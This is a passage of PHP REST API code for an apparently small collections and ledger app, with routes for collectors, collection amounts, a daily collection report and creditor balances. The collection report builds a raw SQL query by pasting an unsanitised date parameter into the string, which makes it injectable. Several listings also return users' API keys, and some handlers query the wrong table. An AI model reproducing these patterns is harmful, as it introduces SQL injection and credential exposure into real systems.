	$r = json_decode($app->request->getBody());
	// echo json_encode($r);
	$db = new DbHandler();
	$params = $db->getFunctionParam("daybook");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$daybookDetail = call_user_func_array(array($db, 'getDaybook'), $getdata);
	if (sizeOf($daybookDetail) > 0) {
		$params = $db->putFunctionParam("daybook");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if($params[$i] == "note1"){
				array_push($putdata, $daybookDetail[0]["note"]);
			}else{
				// echo $params[$i]." - :".putParam($r, $params[$i]);
				if (putParam($r, $params[$i])) {
					array_push($putdata, putParam($r, $params[$i]));
				} else {
					array_push($putdata, "");
				}
			} 
		}
		array_push($putdata, "");

		// echo json_encode($putdata);
		$editDetail = call_user_func_array(array($db, 'editDaybook'), $putdata);
		// echo json_encode($editDetail);
		if ($editDetail) { //if error occurs while creating product

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited Daybook Notes information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing Daybook Notes information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Daybook Notes found with given ID";
	}
	echoRespnse(200, $response);
});




//end daybook



//start collector

$app->post('/collector', function () use ($app) {

	$r = json_decode($app->request->getBody());
	verifyRequiredParams(array('name', 'uid'));
	$Collector = array();
	$Collector["name"] = postParams($app->request->post('name'));
	$Collector["phone"] = postParams($app->request->post('phone'));
	$Collector["status"] = postParams($app->request->post('status'));
	$Collector["uid"] = postParams($app->request->post('uid'));

	$db = new DbHandler();


	$getdata = array();
	$params = $db->getFunctionParam("collectors");
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "uid") {
			array_push($getdata, $Collector["uid"]);
		} else {
			array_push($getdata, "");
		}
	}

	$oldcollectorList = call_user_func_array(array($db, 'getcollectors'), $getdata);


	// echo json_encode(strtolower($Customer["fname"]));echo "-->"; echo json_encode($Customer["phone"]);
	if (sizeof($oldcollectorList) > 0) {
		$response["error"] = true;
		$response["status"] = "error";
		$response["samecus"] = 1;
		$response["message"] = "Oops! Already Collector with same Uid exist";

		echoRespnse(200, $response);
		return;
	}
	$createCollectorstatus = $db->createCollector($Collector);

	if ($createCollectorstatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating Collector";
		$response["err"] = $createCollectorstatus;
	} else {
		$response["error"] = false;
		$response["status"] = "success";
		$response["samecus"] = 0;
		$response["id"] = $createCollectorstatus['id'];
		$response["message"] = "Woot!,Successfully created Collector with id " . $createCollectorstatus['id'];
	}

	echoRespnse(200, $response);
});


$app->get('/collectors', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("collectors");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$collectorsList = call_user_func_array(array($db, 'getCollectors'), $getdata);
	$outputfields = array("id","name","phone","status","uid","username","uidfullname","api_key","uidphone","created","updated");
	$qryfields = array("id","name","phone","status","uid","username","uidfullname","api_key","uidphone","created","updated");
	$Collectors = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($collectorsList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($collectorsList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $collectorsList[$i][$outputfields[$j]];
			}
		}
		array_push($Collectors, $tmp);
	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getpaymentmodes'), $getdata)[0]["count(*)"];

	$response["collectors"] = $Collectors;
	$response["message"] = "Woot!,Successfully retreived the Collectors list";


	echoRespnse(200, $response);

});


$app->get('/collector/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("collectors");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$collectorsList = call_user_func_array(array($db, 'getCollectors'), $getdata);
	// echo json_encode($collectorsList);
	$outputfields = array("id","name","phone","status","uid","username","uidfullname","api_key","uidphone","created","updated"); //db
	$qryfields = array("id","name","phone","status","uid","username","uidfullname","api_key","uidphone","created","updated");
	// $collector=array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($collectorsList); $i++) {
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($collectorsList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $collectorsList[$i][$outputfields[$j]];
			}
		}
		//echo json_encode($tmp);
		//array_push($collector,$tmp);
	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcollectors'), $getdata)[0]["count(*)"];
	$response["collector"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the Collectors list";


	echoRespnse(200, $response);

});

$app->put('/collector/:id', function ($id) use ($app) {

	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("collectors");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$collectorsDetail = call_user_func_array(array($db, 'getCollectors'), $getdata);
	if (sizeOf($collectorsDetail) > 0) {
		$params = $db->putFunctionParam("collectors");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");

		// echo json_encode($putdata);
		$editDetail = call_user_func_array(array($db, 'editCollector'), $putdata);
		// echo json_encode($editDetail);
		if ($editDetail) { //if error occurs while creating product

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited Collector information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing Collector information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Collector found with given ID";
	}
	echoRespnse(200, $response);
});


$app->delete('/collector/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	//echo json_encode($r);
	$params = $db->getFunctionParam("collectors");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$oldcollectorDetail = call_user_func_array(array($db, 'getCollectors'), $getdata);


	if (sizeOf($oldcollectorDetail) > 0) {
		$params = $db->putFunctionParam("collectors");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			array_push($putdata, "");
		}
		array_push($putdata, "1");

		$editDetail = call_user_func_array(array($db, 'editCollector'), $putdata);

		if ($editDetail) {
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully Deleted Collector information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while Deleting Collector  information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Collector found with given ID";
	}
	echoRespnse(200, $response);
});


//stop collector


//start collectors amount


$app->post('/collectoramount', function () use ($app) {
	
	$r = json_decode($app->request->getBody());
	verifyRequiredParams(array('date','collector','amount','collectiondate'));
	$CollectorsAmount = array();
	$CollectorsAmount["date"] = postParams($app->request->post('date'));
	$CollectorsAmount["collector"] = postParams($app->request->post('collector'));
	$CollectorsAmount["amount"] = postParams($app->request->post('amount'));
	$CollectorsAmount["collectiondate"] = postParams($app->request->post('collectiondate'));
	$CollectorsAmount["note"] = postParams($app->request->post('note'));

	$db = new DbHandler();


	$getdata = array();
	$params = $db->getFunctionParam("collectorsamount");
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "collectiondate") {
			array_push($getdata, $CollectorsAmount["collectiondate"]);
		}else if($params[$i] == "collector") {
			array_push($getdata, $CollectorsAmount["collector"]);
		} else {
			array_push($getdata, "");
		}
	}

	$oldcollectorAmountList = call_user_func_array(array($db, 'getCollectorsAmount'), $getdata);
	
	// echo json_encode(strtolower($Customer["fname"]));echo "-->"; echo json_encode($Customer["phone"]);
	
		$totalCollection = 0;
		//first will get collection received entries
		$getdata = array();
		$params = $db->getFunctionParam("receivedamount");
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "collectedby") {
				array_push($getdata, $CollectorsAmount["collector"]);
			}else if ($params[$i] == "rcvddate") {
				array_push($getdata, $CollectorsAmount["collectiondate"]);
			}else if ($params[$i] == "fields") {
				array_push($getdata, " SUM(a.amount) as amount");
			}else if ($params[$i] == "group_by") {
				array_push($getdata, "a.pmid");
			}else{
				array_push($getdata, "");
			}
		}
	
		$rcvdamtList = call_user_func_array(array($db, 'getcolreceived'), $getdata);
		// echo json_encode($rcvdamtList);
		if($rcvdamtList && sizeof($rcvdamtList) > 0){
			for($i =0 ; $i < sizeof($rcvdamtList) ; $i++){
				if($rcvdamtList[$i]["pmid"] != "" && $rcvdamtList[$i]["pmid"] != " "){
					$totalCollection += $rcvdamtList[$i]["pmcredit"];
				}else{
					$totalCollection += $rcvdamtList[$i]["amount"];
				}
			}
		}


		$getdata = array();
		$params = $db->getFunctionParam("drcr");
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "collectedby") {
				array_push($getdata, $CollectorsAmount["collector"]);
			}else if ($params[$i] == "date") {
				array_push($getdata, $CollectorsAmount["collectiondate"]);
			}else if ($params[$i] == "fields") {
				array_push($getdata, " SUM(a.credit) as credit,SUM(m.credit) as pmcredit ");
			}else if ($params[$i] == "group_by") {
				array_push($getdata, "a.pmid");
			}else{
				array_push($getdata, "");
			}
		}
	
		$drcrList = call_user_func_array(array($db, 'getcoldrcr'), $getdata);
		
		if($drcrList && sizeof($drcrList) > 0){
			for($i =0 ; $i < sizeof($drcrList) ; $i++){
				// echo $i."--->".json_encode($drcrList);
				if($drcrList[$i]["pmid"] != ""){
					$totalCollection += $drcrList[$i]["pmcredit"];
				}else{
					$totalCollection += $drcrList[$i]["credit"];
				}
			}
		}


		if (sizeof($oldcollectorAmountList) > 0) {
			for($m=0;$m<sizeof($oldcollectorAmountList);$m++){
				$totalCollection -= $oldcollectorAmountList[$m]['amount'];		
			}
		}

		if($totalCollection >= $CollectorsAmount["amount"]){

			$createCollectorAmountstatus = $db->createCollectorAmount($CollectorsAmount);
			if ($createCollectorAmountstatus['status'] == FAILED) { //if error occurs while creating product
				$response["error"] = true;
				$response["status"] = "error";
				$response["message"] = "Oops! An error occurred while creating Collector";
				$response["err"] = $createCollectorAmountstatus;
			} else {
				$response["error"] = false;
				$response["status"] = "success";
				$response["id"] = $createCollectorAmountstatus['id'];
				$response["message"] = "Woot!,Successfully Created Collection Entry with id " . $createCollectorAmountstatus['id'];
			}
		}else{
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] =  "Receivable Collection Amount of ".changeDateUserFormat($CollectorsAmount["collectiondate"])." is ".$totalCollection." But you entered ".$CollectorsAmount["amount"];
		}

	echoRespnse(200, $response);
});


$app->get('/collectorsamount', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("collectorsamount");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$collectorsAmountList = call_user_func_array(array($db, 'getCollectorsAmount'), $getdata);
	$outputfields = array("id","date","collector","amount","collectiondate","uid","username","uidfullname","api_key","uidphone","created","updated","fields","sort_by","sort_order","group_by","limit","offset","totalcount");
	$qryfields = array("id","date","collector","amount","collectiondate","uid","username","uidfullname","api_key","uidphone","created","updated","fields","sort_by","sort_order","group_by","limit","offset","totalcount");
	$collectorsAmount = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($collectorsAmountList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($collectorsAmountList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $collectorsAmountList[$i][$outputfields[$j]];
			}
		}
		array_push($collectorsAmount, $tmp);
	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getpaymentmodes'), $getdata)[0]["count(*)"];

	$response["collectorsamount"] = $collectorsAmount;
	$response["message"] = "Woot!,Successfully retreived the Collectors list";


	echoRespnse(200, $response);

});


$app->get('/collectoramount/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("collectors");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$collectorsList = call_user_func_array(array($db, 'getCollectors'), $getdata);
	// echo json_encode($collectorsList);
	$outputfields = array("id","name","phone","status","uid","username","uidfullname","api_key","uidphone","created","updated"); //db
	$qryfields = array("id","name","phone","status","uid","username","uidfullname","api_key","uidphone","created","updated");
	// $collector=array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($collectorsList); $i++) {
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($collectorsList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $collectorsList[$i][$outputfields[$j]];
			}
		}
		//echo json_encode($tmp);
		//array_push($collector,$tmp);
	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcollectors'), $getdata)[0]["count(*)"];
	$response["collector"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the Collectors list";


	echoRespnse(200, $response);

});

$app->put('/collectoramount/:id', function ($id) use ($app) {

	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("collectorsamount");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$collectorAmountDetail = call_user_func_array(array($db, 'getCollectorsAmount'), $getdata);
	if (sizeOf($collectorAmountDetail) > 0) {
		$params = $db->putFunctionParam("collectoramount");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");

		// echo json_encode($putdata);
		$editDetail = call_user_func_array(array($db, 'editCollector'), $putdata);
		// echo json_encode($editDetail);
		if ($editDetail) { //if error occurs while creating product

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited Collector information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing Collector information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Collector Amount found with given ID";
	}
	echoRespnse(200, $response);
});


$app->delete('/collectoramount/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	//echo json_encode($r);
	$params = $db->getFunctionParam("collectors");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$oldcollectorDetail = call_user_func_array(array($db, 'getCollectors'), $getdata);


	if (sizeOf($oldcollectorDetail) > 0) {
		$params = $db->putFunctionParam("collectors");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			array_push($putdata, "");
		}
		array_push($putdata, "1");

		$editDetail = call_user_func_array(array($db, 'editCollector'), $putdata);

		if ($editDetail) {
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully Deleted Collector information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while Deleting Collector  information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Collector found with given ID";
	}
	echoRespnse(200, $response);
});


//end collectors amount

//start collection report
$app->get('/collectionreport', function () use ($app) {
	
	$response = array();
	$db = new DbHandler();
	$date = $app->request->get("date");
	$collector = $app->request->get("collector");
	$report = array();
	$onlineReport = array();
	// $pmids = "";
	// $seperator = "";
	$rcvdpmtrans = false;
	$drcrpmtrans = false;
	$onlinecollection = array();
	// $report["receivedList"] = array();
	// $report["drcrList"] = array();

	$getdata = array();
	$params = $db->getFunctionParam("receivedamount");
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "collectedby") {
			array_push($getdata, $collector);
		}else if ($params[$i] == "rcvddate") {
			array_push($getdata, $date);
		// } else if ($params[$i] == "group_by") {
		// 	array_push($getdata, "a.pmid");
		}else{
			array_push($getdata, "");
		}
	}

		// echo json_encode($getdata);
		$rcvdamtList = call_user_func_array(array($db, 'getcolreceived'), $getdata);
		// echo json_encode($rcvdamtList);
		if($rcvdamtList && sizeof($rcvdamtList) > 0){
			for($i =0 ; $i < sizeof($rcvdamtList) ; $i++){
				$tmp = array();
				$tmp['id'] = $rcvdamtList[$i]["id"];
				$tmp['date'] = $rcvdamtList[$i]["rcvddate"];
				$tmp['customername'] = $rcvdamtList[$i]["customername"];
				$tmp['tYpe'] = $rcvdamtList[$i]["tYpe"];
				$tmp['tablename'] = "received";
				$tmp['chiti'] = $rcvdamtList[$i]["chiti"];
				$tmp['note'] = $rcvdamtList[$i]["note"];
				$tmp['collector'] = $rcvdamtList[$i]["collectedby"];
				$tmp['collectorname'] = $rcvdamtList[$i]["collectorname"];
				$tmp['paymentmode'] = $rcvdamtList[$i]["paymentmode"];
				$tmp['pmid'] = $rcvdamtList[$i]["pmid"];
				$tmp['pmtrans'] = [];
				$tmp['paymentmodename'] = $rcvdamtList[$i]["paymentmodename"];
				$tmp['amount'] = 0;
				$tmp['type'] = "collection";
				if($rcvdamtList[$i]["paymentmode"] == 50){
					$rcvdpmtrans = true;
					// echo "pmids".$pmids."seperator".$seperator;
					$tmp['amount'] = $rcvdamtList[$i]["pmcredit"]; //getting total of pmtrans that is rcvd in cash
					// $pmids .= $seperator . $rcvdamtList[$i]["pmid"];
					// $seperator = ',';
					// $totalCollection += $rcvdamtList[$i]["amount"];
					// echo "pmids1  ".$pmids."seperator1  ".$seperator;
				}else{
					$tmp['amount'] = $rcvdamtList[$i]["amount"];
					// $totalCollection += $rcvdamtList[$i]["credit"];
				}
				array_push($report,$tmp);
			}
		}
		

		$getdata = array();
		$params = $db->getFunctionParam("drcr");
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "collectedby") {
				array_push($getdata, $collector);
			}else if ($params[$i] == "date") {
				array_push($getdata, $date);
			} else if ($params[$i] == "group_by") {
				array_push($getdata, "a.pmid");
			} else if ($params[$i] == "fields") {
				array_push($getdata, "sum(m.credit) as pmcredit");
			}else{
				array_push($getdata, "");
			}
		}
	
		$drcrList = call_user_func_array(array($db, 'getcoldrcr'), $getdata);
		// echo json_encode($drcrList);
		if($drcrList && sizeof($drcrList) > 0){
			// $report["drcrList"] = $drcrList;
			for($i =0 ; $i < sizeof($drcrList) ; $i++){
				$tmp = array();
				$tmp['date'] = $drcrList[$i]["date"];
				$tmp['customer'] = $drcrList[$i]["customer"];
				$tmp['customername'] = $drcrList[$i]["customername"];
				$tmp['forint'] = $drcrList[$i]["forint"];
				$tmp['note'] = $drcrList[$i]["note"];
				$tmp['collector'] = $drcrList[$i]["collectedby"];
				$tmp['collectorname'] = $drcrList[$i]["collectorname"];
				$tmp['paymentmode'] = $drcrList[$i]["paymentmode"];
				$tmp['pmid'] = $drcrList[$i]["pmid"];
				$tmp['paymentmodename'] = $drcrList[$i]["paymentmodename"];
				$tmp['amount'] = 0;
				$tmp['type'] = "drcr";
				if($tmp['paymentmode'] == 50){
					$tmp['amount'] = $drcrList[$i]["pmcredit"];
				}else{
					$tmp['amount'] = $drcrList[$i]["credit"];
					
				}


				
				array_push($report,$tmp);
			}
		}
		

		$getdata = array();
		$params = $db->getFunctionParam("collectorsamount");
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "collectiondate") {
				array_push($getdata, $date);
			}else if($params[$i] == "collector") {
				array_push($getdata, $collector);
			} else {
				array_push($getdata, "");
			}
		}
	
		$collectorAmountList = call_user_func_array(array($db, 'getCollectorsAmount'), $getdata);

		if($collector == "2"){
			$onlinecollection = $db->getmultiRecord("SELECT*,a.id as id,m.pmcredit as pmcredit,CONCAT(b.firstname,' ',b.lastname)as customername,a.customer as customer,a.amount as amount,a.paymentmode as paymentmode,p.modename as paymentmodename,a.pmid as pmid,a.note as note,c.amount as colamt,d.tYpe as tYpe,a.colid as colid,a.rcvddate as rcvddate,d.code as code,c.sowji as sowjicomm,c.suri as suricomm,c.fullandevi as fullandevicomm,s.chiti as asaluchiti,a.chiti as chiti,c.date as coldate,a.collectedby as collectedby from `received`a left join customers b on a.customer=b.id LEFT JOIN collection c on a.colid=c.id and c.deleted=0 LEFT JOIN chiti d on a.chiti=d.id and d.deleted=0 LEFT JOIN asalu s on a.asaluid=s.id and s.deleted=0 LEFT JOIN paymentmodes p on a.paymentmode=p.id and p.deleted=0 LEFT JOIN(SELECT x.id as id,sum(y.credit)as pmcredit,y.tableid as pmid from received x left join pmtrans y on x.id=y.tableid and y.tablename='received'and y.paymentmode>1 and y.deleted=0 group by y.tableid)m on a.id=m.id where a.deleted=0 and b.deleted=0 and a.rcvddate='". $date. "'  and a.paymentmode > 1 and a.chiti > 0 ");
			if($onlinecollection && sizeof($onlinecollection) > 0){
				for($i =0 ; $i < sizeof($onlinecollection) ; $i++){
					$tmp = array();
					$tmp['id'] = $onlinecollection[$i]["id"];
					$tmp['date'] = $onlinecollection[$i]["rcvddate"];
					$tmp['customername'] = $onlinecollection[$i]["customername"];
					$tmp['tYpe'] = $onlinecollection[$i]["tYpe"];
					$tmp['tablename'] = "received";
					$tmp['chiti'] = $onlinecollection[$i]["chiti"];
					$tmp['note'] = $onlinecollection[$i]["note"];
					$tmp['collector'] = $onlinecollection[$i]["collectedby"];
					$tmp['collectorname'] = "";
					$tmp['paymentmode'] = $onlinecollection[$i]["paymentmode"];
					$tmp['pmid'] = $onlinecollection[$i]["pmid"];
					$tmp['pmtrans'] = [];
					$tmp['paymentmodename'] = $onlinecollection[$i]["paymentmodename"];
					$tmp['amount'] = 0;
					$tmp['type'] = "collection";
					if($onlinecollection[$i]["paymentmode"] == 50){
						$rcvdpmtrans = true;
						// echo "pmids".$pmids."seperator".$seperator;
						$tmp['amount'] = $onlinecollection[$i]["pmcredit"]; //getting total of pmtrans that is rcvd in cash
						// $pmids .= $seperator . $onlinecollection[$i]["pmid"];
						// $seperator = ',';
						// $totalCollection += $onlinecollection[$i]["amount"];
						// echo "pmids1  ".$pmids."seperator1  ".$seperator;
					}else{
						$tmp['amount'] = $onlinecollection[$i]["amount"];
						// $totalCollection += $onlinecollection[$i]["credit"];
					}
					array_push($onlineReport,$tmp);
				}
			}
			
		}

		$collectionreport = array();
		$collectionreport['collectionList'] = $report;
		$collectionreport['collectionRcvd'] = $collectorAmountList;
		$collectionreport['onlinecollection'] = $onlineReport;

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getpaymentmodes'), $getdata)[0]["count(*)"];

	$response["collectionreport"] = $collectionreport;
	$response["message"] = "Woot!,Successfully retreived the Collectors list";


	echoRespnse(200, $response);

});


//end collection report

//start yesno

$app->get('/yesno', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("yesno");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$YesnoList = call_user_func_array(array($db, 'getYesno'), $getdata);
	$outputfields = array("id","name");
	$qryfields = array("id","name");
	$Yesno = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($YesnoList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($YesnoList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $YesnoList[$i][$outputfields[$j]];
			}
		}
		array_push($Yesno, $tmp);
	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getpaymentmodes'), $getdata)[0]["count(*)"];

	$response["yesno"] = $Yesno;
	$response["message"] = "Woot!,Successfully retreived the Yesno list";


	echoRespnse(200, $response);

});


//end yesno

//start creditors
$app->get('/creditors', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	// $todaydate = $app->request->get("todaydate");

	$params = $db->getFunctionParam("customers");
	$getdata = array();
	// for($i=0;$i<sizeof($params);$i++){
	// 		if($params[$i] == "forint"){
	// 			array_push($getdata,1);
	// 		// }else if($params[$i] == "sort_by"){
	// 		// 	array_push($getdata,"a.firstname");
	// 		// }else if($params[$i] == "sort_order" ){
	// 		// 	array_push($getdata,"asc");
	// 		}else{
	// 			array_push($getdata,"");
	// 		}
	// }
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$intcustomersList = call_user_func_array(array($db, 'getcustomers'), $getdata);

	if (sizeof($intcustomersList) > 0) {
		$creditors = array();
		for ($j = 0; $j < sizeof($intcustomersList); $j++) {
			$tmpcust = array();
			$tmpcust["customer"] = $intcustomersList[$j]["id"];
			$tmpcust["customername"] = $intcustomersList[$j]["firstname"] . ' ' . $intcustomersList[$j]["lastname"];
			$tmpcust["intrate"] = $intcustomersList[$j]["intrate"];
			$tmpcust["amount"] = 0;
			$tmpcust["interest"] = 0;

			//getting gave and took entries total
			$params = $db->getFunctionParam("drcr");
			$getdata = array();
			for ($i = 0; $i < sizeof($params); $i++) {
				if ($params[$i] == "customer") {
					array_push($getdata, $intcustomersList[$j]["id"]);
				} else if ($params[$i] == "forint") {
					if (getParams($app->request->get("forint")) != "1") {
						$tmp = array();
						$tmp["op"] = "!=";
						$tmp["value"] = 1;
						array_push($getdata, json_encode($tmp));
					} else {
						array_push($getdata, 1);
					}
				} else if ($params[$i] == "fields") {
					array_push($getdata, "sum(credit) as credit,sum(debit) as debit");
				} else {
					array_push($getdata, "");
				}
			}
			$drcrList = call_user_func_array(array($db, 'getdrcr'), $getdata);

			if (sizeof($drcrList) > 0) {
				$tmpcust["amount"] += $drcrList[0]["credit"] - $drcrList[0]["debit"];
			}


			//will calculate interest calculated and paid total 
			if (getParams($app->request->get("forint"))) {
				$params = $db->getFunctionParam("interest");
				$getdata = array();
				for ($k = 0; $k < sizeof($params); $k++) {
					if ($params[$k] == "customer") {
						array_push($getdata, $intcustomersList[$j]["id"]);
					} else if ($params[$k] == "fields") {
						array_push($getdata, "sum(credit) as credit,sum(debit) as debit");
					} else {
						array_push($getdata, "");
					}
				}

				$interestList = call_user_func_array(array($db, 'getInterest'), $getdata);

				if (sizeof($interestList) > 0) {
					$tmpcust["interest"] += $interestList[0]["credit"] - $interestList[0]["debit"];
				}

				// echo $j."->".json_encode($tmpcust);

				//last int month added
				// $params= $db->getFunctionParam("interest");
				$getdata = array();
				for ($k = 0; $k < sizeof($params); $k++) {
					if ($params[$k] == "customer") {
						array_push($getdata, $intcustomersList[$j]["id"]);
					} else if ($params[$k] == "fields") {
						array_push($getdata, "MAX(date) as lastintmonth");
					} else {
						array_push($getdata, "");
					}
				}

				$intmonth = call_user_func_array(array($db, 'getInterest'), $getdata);
				// echo json_encode($intmonth);
				$tmpcust["lastintmonth"] = $intmonth[0]["lastintmonth"];



				$tmpcust["inttilldate"] = $intmonth[0]["lastintmonth"];
			}

			array_push($creditors, $tmpcust);


		}
		$response['status'] = "success";
